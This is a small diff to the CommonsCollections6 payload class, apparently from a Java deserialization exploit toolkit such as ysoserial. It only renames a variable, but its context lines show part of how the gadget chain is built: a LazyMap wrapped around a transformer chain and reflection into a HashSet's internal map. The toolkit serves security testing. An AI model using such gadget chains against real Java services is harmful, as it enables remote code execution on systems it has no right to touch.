@@ -47,8 +47,8 @@ public class CommonsCollections6 implements ObjectPayload<Object> {
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
 
-        HashSet map = new HashSet(1);
-        map.add("x");
+        HashSet hashSet = new HashSet(1);
+        hashSet.add("x");
         Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
@@ -57,7 +57,7 @@ public class CommonsCollections6 implements ObjectPayload<Object> {
         }
 
         Reflections.setAccessible(f);
-        HashMap innimpl = (HashMap) f.get(map);
+        HashMap innimpl = (HashMap) f.get(hashSet);
 
         Field f2 = null;
         try {
@@ -85,6 +85,6 @@ public class CommonsCollections6 implements ObjectPayload<Object> {
         keyField.set(node, entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
-        return map;
+        return hashSet;
     }
 }
